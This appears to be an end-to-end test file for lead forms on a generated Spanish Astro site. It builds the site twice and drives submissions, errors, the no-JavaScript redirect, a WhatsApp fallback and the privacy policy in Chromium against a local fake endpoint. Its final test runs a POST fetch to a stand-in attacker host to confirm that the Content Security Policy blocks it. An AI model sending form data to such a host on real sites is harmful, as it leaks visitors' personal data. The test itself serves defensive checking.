// Lead forms end to end in a real site (add-lead-forms, tasks 4.1, 5.1 and 7.1): scaffold a Spanish site from the
// brief fixture with two forms, generate legal.json, build it twice and drive the pages in Chromium.
//  - build A posts to a LOCAL fake endpoint (FORMS_TEST_ENDPOINT) with the legal data of an older brief
//    (`forms: true`): fetch submit, errors, 429, the no-JavaScript POST and redirect, the WhatsApp fallback.
//  - build B is the real shape (default endpoint, CSP opened for Web3Forms): the policy names the provider, the report's
//    legal-forms item reads it, and Chromium runs it with the provider's origin intercepted (nothing leaves the machine).
// Tests never call Web3Forms. Scaffolded under .cache/ (ignored by git) so node resolves astro; removed afterwards.
import assert from 'node:assert/strict';
import {
  cpSync,
  existsSync,
  mkdirSync,
  readFileSync,
  renameSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { createServer } from 'node:http';
import { join, resolve } from 'node:path';
import { after, before, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright';

import { main as reportMain } from '../scripts/landing-report.mjs';
import { main as legalMain } from '../scripts/legal.mjs';
import { scaffoldSite } from '../scripts/new-site.mjs';
import { build, startStatic, freePort } from '../scripts/qa/server.mjs';
import { WEBGL_ARGS } from '../scripts/qa/scene-checks.mjs';

const ROOT = resolve(fileURLToPath(new URL('..', import.meta.url)));
const FIXTURE = join(ROOT, 'tests/fixtures/brief');
const base = join(ROOT, '.cache', `forms-site-test-${process.pid}`);
const slug = 'zz-forms-es';
const siteDir = join(base, 'sites', slug);
const src = (rel) => join(siteDir, 'src', rel);
const KEY = '11111111-2222-4333-8444-555555555555';

const envChrome = process.env.QA_CHROME_PATH || process.env.CHROME_PATH;
const chromePath = envChrome || chromium.executablePath();
const skip = existsSync(chromePath) ? false : 'no Chromium installed';

const FORMS = `import type { LeadFormConfig } from '../components/forms/fields';

export const forms: LeadFormConfig[] = [
  {
    id: 'valoracion',
    purpose: 'valuation',
    fields: ['name', 'email', 'phone', 'address', 'size', 'message'],
    provider: 'web3forms',
    accessKey: '${KEY}',
  },
  {
    id: 'llamada',
    purpose: 'callback',
    fields: ['name', 'phone', 'preferredTime'],
    provider: 'web3forms',
  },
];
`;
const page = (body, extra = '') => `---
import BaseLayout from '../layouts/BaseLayout.astro';
${extra}
---

<BaseLayout title="Taller Plantilla" description="Plantillas de Notion para freelances." lang="es">
${body}
</BaseLayout>
`;
const HOME = page(
  `  <section class="mx-auto max-w-2xl px-6 py-16">
    <h1 class="font-display text-3xl">Tu trabajo en orden</h1>
    <LeadForm form={forms[0]} legal={legal as LegalData} businessName="Taller Plantilla" whatsapp="+34 600 123 456" thanksHref="/gracias/" endpoint={process.env.FORMS_TEST_ENDPOINT} />
    <LeadForm form={forms[1]} legal={legal as LegalData} businessName="Taller Plantilla" whatsapp="+34 600 123 456" />
  </section>`,
  `import LeadForm from '../components/forms/LeadForm.astro';
import legal from '../data/legal.json';
import { forms } from '../data/forms';
import type { LegalData } from '../components/legal/texts';`,
);
const PRIVACY = page(
  '  <PrivacyPolicy data={legal as LegalData} />',
  `import PrivacyPolicy from '../components/legal/PrivacyPolicy.astro';
import legal from '../data/legal.json';
import type { LegalData } from '../components/legal/texts';`,
);
const THANKS = `---
import BaseLayout from '../layouts/BaseLayout.astro';
import ThankYou from '../components/forms/ThankYou.astro';
---

<BaseLayout title="Gracias" description="Gracias por tu solicitud." lang="es" noindex>
  <ThankYou locale="es" />
</BaseLayout>
`;

// A fake form service: records what it receives and answers as the test says.
let fake;
const received = [];
let mode = 'ok';
let redirectTo = '';
async function startFake() {
  const server = createServer(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const raw = Buffer.concat(chunks);
    const type = req.headers['content-type'] ?? '';
    const fields = {};
    if (req.method === 'POST') {
      if (type.startsWith('multipart/form-data')) {
        const data = await new Response(raw, {
          headers: { 'content-type': type },
        }).formData();
        for (const [key, value] of data.entries()) fields[key] = value;
      } else if (type.startsWith('application/x-www-form-urlencoded')) {
        for (const [key, value] of new URLSearchParams(raw.toString()))
          fields[key] = value;
      }
      received.push({ type, fields, url: req.url });
    }
    res.setHeader('access-control-allow-origin', '*');
    if (req.method === 'OPTIONS') {
      res.writeHead(204, { 'access-control-allow-headers': '*' }).end();
    } else if (mode === 'redirect') {
      res.writeHead(303, { location: redirectTo }).end();
    } else if (mode === '429') {
      res
        .writeHead(429, { 'content-type': 'application/json' })
        .end(JSON.stringify({ success: false, message: 'rate limit' }));
    } else if (mode === 'fail') {
      res
        .writeHead(500, { 'content-type': 'application/json' })
        .end(JSON.stringify({ success: false, message: 'boom' }));
    } else {
      res
        .writeHead(200, { 'content-type': 'application/json' })
        .end(JSON.stringify({ success: true, message: 'ok' }));
    }
  });
  const port = await freePort();
  await new Promise((ok) => server.listen(port, '127.0.0.1', ok));
  return {
    url: `http://127.0.0.1:${port}/submit`,
    close: () =>
      new Promise((done) => (server.closeAllConnections(), server.close(done))),
  };
}

let distA;
let distB;
let serverA;
let serverB;
let browser;

const readLegal = () =>
  JSON.parse(readFileSync(src('data/legal.json'), 'utf8'));
const quiet = { log() {}, error() {} };

before(async () => {
  rmSync(base, { recursive: true, force: true });
  mkdirSync(siteDir, { recursive: true });
  const brief = JSON.parse(readFileSync(join(FIXTURE, 'brief.json'), 'utf8'));
  brief.contact.phone = '+34 600 123 456';
  brief.legal.processing.forms = true;
  brief.forms = [
    {
      id: 'valoracion',
      purpose: 'valuation',
      fields: ['name', 'email', 'phone', 'address', 'size', 'message'],
      provider: 'web3forms',
      accessKey: KEY,
    },
    {
      id: 'llamada',
      purpose: 'callback',
      fields: ['name', 'phone', 'preferredTime'],
      provider: 'web3forms',
    },
  ];
  writeFileSync(join(siteDir, 'brief.json'), JSON.stringify(brief, null, 2));
  cpSync(join(FIXTURE, 'assets'), join(siteDir, 'assets'), { recursive: true });
  scaffoldSite({
    slug,
    sitesDir: join(base, 'sites'),
    allowExistingDocs: true,
    title: 'Taller Plantilla',
    lang: 'es',
  });
  writeFileSync(join(base, 'package-lock.json'), '{}\n');
  // `site` makes the redirect of the no-JavaScript path an absolute URL.
  const config = join(siteDir, 'astro.config.mjs');
  writeFileSync(
    config,
    readFileSync(config, 'utf8').replace(
      "  output: 'static',\n",
      "  output: 'static',\n  site: 'https://fixture.example',\n",
    ),
  );
  mkdirSync(src('data'), { recursive: true });
  writeFileSync(src('data/forms.ts'), FORMS);
  writeFileSync(src('pages/index.astro'), HOME);
  writeFileSync(src('pages/privacidad.astro'), PRIVACY);
  writeFileSync(src('pages/gracias.astro'), THANKS);
  assert.equal(legalMain(['--site', slug, '--write'], quiet, base), 0);

  // Build A: the local fake endpoint and the legal data of an older brief (`forms: true`).
  fake = await startFake();
  const real = readLegal();
  writeFileSync(
    src('data/legal.json'),
    JSON.stringify({
      ...real,
      processing: { ...real.processing, forms: true },
    }),
  );
  process.env.FORMS_TEST_ENDPOINT = fake.url;
  await build(siteDir);
  delete process.env.FORMS_TEST_ENDPOINT;
  distA = join(base, 'dist-a');
  renameSync(join(siteDir, 'dist'), distA);

  // Build B: the real shape.
  assert.equal(legalMain(['--site', slug, '--write'], quiet, base), 0);
  await build(siteDir);
  distB = join(siteDir, 'dist');

  if (skip) return;
  serverA = await startStatic(distA);
  serverB = await startStatic(distB);
  browser = await chromium.launch({
    ...(envChrome ? { executablePath: envChrome } : {}),
    args: WEBGL_ARGS,
  });
});
after(async () => {
  await browser?.close();
  await serverA?.close();
  await serverB?.close();
  await fake?.close();
  rmSync(base, { recursive: true, force: true });
});

const html = (dist, rel) => readFileSync(join(dist, rel), 'utf8');
const cspOf = (text) =>
  /<meta http-equiv="content-security-policy" content="([^"]+)"/.exec(
    text,
  )?.[1];
const FILL = {
  '#form-valoracion-name': 'Ana Pérez',
  '#form-valoracion-email': 'ana@example.com',
  '#form-valoracion-phone': '+34 600 111 222',
  '#form-valoracion-address': 'Calle Mayor 1, Valencia',
  '#form-valoracion-size': '85',
  '#form-valoracion-message': 'Quisiera vender en primavera.',
};
async function fill(page, extra = {}) {
  for (const [selector, value] of Object.entries({ ...FILL, ...extra }))
    await page.fill(selector, value);
}
const form = '#form-valoracion';
const status = `${form} [data-form-status]`;

// --- The build -------------------------------------------------------------------------------------------------

test('the real form is plain HTML: key, subject, honeypot, absolute redirect, consent that links the Spanish policy', () => {
  const home = html(distA, 'index.html');
  assert.match(home, new RegExp(`<form[^>]+action="${fake.url}"`));
  for (const piece of [
    `name="access_key" value="${KEY}"`,
    'name="subject" value="Taller Plantilla: nueva solicitud de valoración"',
    'name="from_name" value="Taller Plantilla"',
    'name="redirect" value="https://fixture.example/gracias/"',
    'name="botcheck"',
    'type="email"',
    'type="tel"',
    'autocomplete="street-address"',
    'inputmode="decimal"',
    'href="/privacidad/"',
    'He leído la ',
  ])
    assert.ok(home.includes(piece), piece);
  assert.match(home, /<input[^>]+name="consent"[^>]+required/);
  assert.match(home, /<p[^>]+role="status"[^>]+aria-live="polite"/);
});

test('a web3forms form without an access key renders as the WhatsApp fallback, with a plain wa.me link', () => {
  const home = html(distA, 'index.html');
  assert.match(
    home,
    /data-form-provider="whatsapp"[^>]+data-form-fallback="web3forms"/,
  );
  assert.match(home, /href="https:\/\/wa\.me\/34600123456\?text=/);
  const fallback = /<form id="form-llamada"[^>]*>/.exec(home)[0];
  assert.ok(!fallback.includes('api.web3forms.com'));
  assert.ok(
    !/access_key/.test(home.split('form-llamada')[1].split('</form>')[0]),
  );
  assert.ok(/\shidden[\s>]/.test(fallback), 'hidden until JavaScript runs');
});

test('the thank-you page is noindex and out of the sitemap', () => {
  assert.match(
    html(distB, 'gracias/index.html'),
    /<meta name="robots" content="noindex"/,
  );
  assert.ok(!html(distB, 'sitemap.xml').includes('/gracias/'));
  assert.match(html(distB, 'gracias/index.html'), /Gracias/);
});

test('the CSP opens Web3Forms in form-action and connect-src only when the legal data says so', () => {
  const a = cspOf(html(distA, 'index.html'));
  assert.ok(!a.includes('web3forms') && !/form-action|connect-src/.test(a), a);
  const b = cspOf(html(distB, 'index.html'));
  assert.match(b, /form-action 'self' https:\/\/api\.web3forms\.com/);
  assert.match(b, /connect-src 'self' https:\/\/api\.web3forms\.com/);
  assert.ok(!/script-src[^;]*'unsafe-inline'/.test(b));
  assert.deepEqual(
    [...new Set(b.match(/https?:\/\/[^\s;]+/g))],
    ['https://api.web3forms.com'],
  );
});

test('the privacy policy names Web3Forms, the transfer, the purposes and fields in Spanish; an older `forms: true` keeps the old sentence', () => {
  const policy = html(distB, 'privacidad/index.html');
  for (const value of [
    'Web3Forms',
    'Web3Creative (Kerala, India)',
    'Estados Unidos',
    'transferencia internacional',
    'no almacena los envíos',
    'cada dos meses',
    'preparar y responder tu solicitud de valoración',
    'devolverte la llamada',
    'correo electrónico',
    'dirección del inmueble',
    'WhatsApp',
    'Si nos contactas mediante un formulario',
  ])
    assert.ok(policy.includes(value), value);
  const old = html(distA, 'privacidad/index.html');
  assert.ok(old.includes('Si nos contactas mediante un formulario'));
  assert.ok(!old.includes('Web3Forms'));
  // The key-less form counts as WhatsApp in the policy, since that is what it does.
  assert.deepEqual(readLegal().processing.forms.providers, [
    'web3forms',
    'whatsapp',
  ]);
  assert.equal(readLegal().processing.forms.provider, 'web3forms');
});

test('the report: legal-forms warns about the fallback form and fails nothing', async () => {
  const out = [];
  const code = await reportMain(
    [
      '--site',
      slug,
      '--only',
      'static',
      '--skip',
      'audit,perf',
      '--out',
      join(base, 'qa'),
    ],
    { log: (m) => out.push(m), error: (m) => out.push(m) },
    { root: base },
  );
  const latest = join(base, 'qa', slug, 'report', 'latest', 'report.json');
  const report = JSON.parse(readFileSync(latest, 'utf8'));
  const item = report.items.find((i) => i.id === 'legal-forms');
  assert.equal(item.status, 'warn', JSON.stringify(item));
  assert.match(item.evidence.join('\n'), /falls back to WhatsApp/);
  assert.ok(
    report.items.every((i) => i.id !== 'legal-forms' || i.status !== 'fail'),
    out.join('\n'),
  );
  assert.ok([0, 1].includes(code)); // legal-pages fails here: the fixture has no legal notice page
});

// --- Browser: build A against the local fake ------------------------------------------------------------------

async function open(server, { js = true } = {}) {
  const context = await browser.newContext({ javaScriptEnabled: js });
  const page = await context.newPage();
  await page.goto(`${server.baseUrl}/`, { waitUntil: 'load' });
  return { context, page };
}

test(
  'with JavaScript: the consent box blocks sending; then fetch posts FormData without redirect and announces success',
  { skip },
  async () => {
    received.length = 0;
    mode = 'ok';
    const { context, page } = await open(serverA);
    await fill(page);
    await page.click(`${form} button[type="submit"]`);
    await page.waitForTimeout(300);
    assert.equal(received.length, 0, 'sent without consent');
    assert.equal(await page.textContent(status), '');
    await page.check(`${form} input[name="consent"]`);
    await page.click(`${form} button[type="submit"]`);
    await page.waitForFunction(
      (sel) => document.querySelector(sel).textContent.includes('Gracias'),
      status,
    );
    assert.equal(received.length, 1);
    const [post] = received;
    assert.match(post.type, /^multipart\/form-data/);
    assert.equal(post.fields.access_key, KEY);
    assert.equal(post.fields.name, 'Ana Pérez');
    assert.equal(post.fields.email, 'ana@example.com');
    assert.equal(post.fields.phone, '+34 600 111 222');
    assert.equal(post.fields.consent, 'accepted');
    assert.equal(
      post.fields.subject,
      'Taller Plantilla: nueva solicitud de valoración',
    );
    assert.ok(
      !('redirect' in post.fields),
      'redirect must not be sent by fetch',
    );
    assert.ok(!('botcheck' in post.fields));
    assert.equal(new URL(page.url()).pathname, '/');
    assert.equal(await page.isDisabled(`${form} button[type="submit"]`), false);
    assert.equal(
      await page.inputValue('#form-valoracion-name'),
      '',
      'form reset after success',
    );
    assert.equal(await page.getAttribute(status, 'aria-live'), 'polite');
    await context.close();
  },
);

test(
  'with JavaScript: an error is announced and the typed values stay; a 429 gets its own message',
  { skip },
  async () => {
    const { context, page } = await open(serverA);
    await fill(page);
    await page.check(`${form} input[name="consent"]`);
    for (const [m, text] of [
      ['fail', 'No hemos podido enviar'],
      ['429', 'Demasiadas solicitudes'],
    ]) {
      mode = m;
      received.length = 0;
      await page.click(`${form} button[type="submit"]`);
      await page.waitForFunction(
        ([sel, t]) => document.querySelector(sel).textContent.includes(t),
        [status, text],
      );
      assert.equal(received.length, 1, m);
      assert.equal(
        await page.inputValue('#form-valoracion-name'),
        'Ana Pérez',
        m,
      );
      assert.equal(
        await page.inputValue('#form-valoracion-message'),
        'Quisiera vender en primavera.',
        m,
      );
      assert.equal(
        await page.isDisabled(`${form} button[type="submit"]`),
        false,
        m,
      );
    }
    mode = 'ok';
    await context.close();
  },
);

test(
  'without JavaScript: the browser posts the form with the key and the absolute redirect, and lands on the thank-you page',
  { skip },
  async () => {
    received.length = 0;
    mode = 'redirect';
    redirectTo = `${serverA.baseUrl}/gracias/`;
    const { context, page } = await open(serverA, { js: false });
    await fill(page);
    await page.check(`${form} input[name="consent"]`);
    await Promise.all([
      page.waitForURL('**/gracias/'),
      page.click(`${form} button[type="submit"]`),
    ]);
    assert.equal(received.length, 1);
    assert.match(received[0].type, /^application\/x-www-form-urlencoded/);
    assert.equal(received[0].fields.access_key, KEY);
    assert.equal(
      received[0].fields.redirect,
      'https://fixture.example/gracias/',
    );
    assert.equal(received[0].fields.consent, 'accepted');
    assert.equal(received[0].fields.address, 'Calle Mayor 1, Valencia');
    assert.ok(await page.textContent('h1').then((t) => t.includes('Gracias')));
    mode = 'ok';
    await context.close();
  },
);

test(
  'without JavaScript the WhatsApp form stays hidden and its plain link works; with JavaScript the form replaces the link',
  { skip },
  async () => {
    const off = await open(serverA, { js: false });
    assert.equal(await off.page.isVisible('#form-llamada'), false);
    const link = off.page.locator('[data-form-wa-link] a');
    assert.equal(await link.isVisible(), true);
    assert.match(
      await link.getAttribute('href'),
      /^https:\/\/wa\.me\/34600123456\?text=/,
    );
    await off.context.close();

    received.length = 0;
    const { context, page } = await open(serverA);
    assert.equal(await page.isVisible('#form-llamada'), true);
    assert.equal(await page.locator('[data-form-wa-link]').count(), 0);
    const opened = [];
    await context.route('https://wa.me/**', (route) => {
      opened.push(route.request().url());
      return route.fulfill({ body: 'ok', contentType: 'text/plain' });
    });
    await page.fill('#form-llamada-name', 'Luis');
    await page.fill('#form-llamada-phone', '600 333 444');
    await page.selectOption('#form-llamada-preferredTime', { label: 'Tarde' });
    await page.check('#form-llamada input[name="consent"]');
    const popup = context.waitForEvent('page');
    await page.click('#form-llamada button[type="submit"]');
    await (await popup).waitForLoadState();
    assert.equal(opened.length, 1);
    const url = new URL(opened[0]);
    assert.equal(url.origin + url.pathname, 'https://wa.me/34600123456');
    const text = url.searchParams.get('text');
    assert.match(text, /^Hola, por favor llámame\./);
    assert.match(text, /Nombre: Luis/);
    assert.match(text, /Teléfono: 600 333 444/);
    assert.match(text, /Mejor hora para llamar: Tarde/);
    assert.equal(
      received.length,
      0,
      'the WhatsApp form must not call any form service',
    );
    await context.close();
  },
);

// --- Browser: build B under the real CSP, with the provider's origin intercepted -----------------------------

test(
  'under the CSP the form posts to api.web3forms.com (intercepted) and nothing else can be reached',
  { skip },
  async () => {
    const context = await browser.newContext();
    const page = await context.newPage();
    const seen = [];
    await context.route('https://api.web3forms.com/**', (route) => {
      seen.push({
        url: route.request().url(),
        body: route.request().postData() ?? '',
      });
      return route.fulfill({
        status: 200,
        contentType: 'application/json',
        headers: { 'access-control-allow-origin': '*' },
        body: JSON.stringify({ success: true }),
      });
    });
    await page.addInitScript(() => {
      window.__violations = [];
      document.addEventListener('securitypolicyviolation', (e) =>
        window.__violations.push(`${e.violatedDirective} ${e.blockedURI}`),
      );
    });
    await page.goto(`${serverB.baseUrl}/`, { waitUntil: 'load' });
    await fill(page);
    await page.check(`${form} input[name="consent"]`);
    await page.click(`${form} button[type="submit"]`);
    await page.waitForFunction(
      (sel) => document.querySelector(sel).textContent.includes('Gracias'),
      status,
    );
    assert.equal(seen.length, 1);
    assert.equal(seen[0].url, 'https://api.web3forms.com/submit');
    assert.ok(seen[0].body.includes(KEY));
    assert.deepEqual(await page.evaluate(() => window.__violations), []);
    // Another origin is refused by connect-src and form-action.
    const blocked = await page.evaluate(() =>
      fetch('https://forms.evil.example/post', {
        method: 'POST',
        body: 'x',
      }).then(
        () => 'allowed',
        () => 'blocked',
      ),
    );
    assert.equal(blocked, 'blocked');
    const violations = await page.evaluate(() => window.__violations);
    assert.ok(
      violations.some((v) => v.startsWith('connect-src')),
      violations.join(' | '),
    );
    await context.close();
  },
);
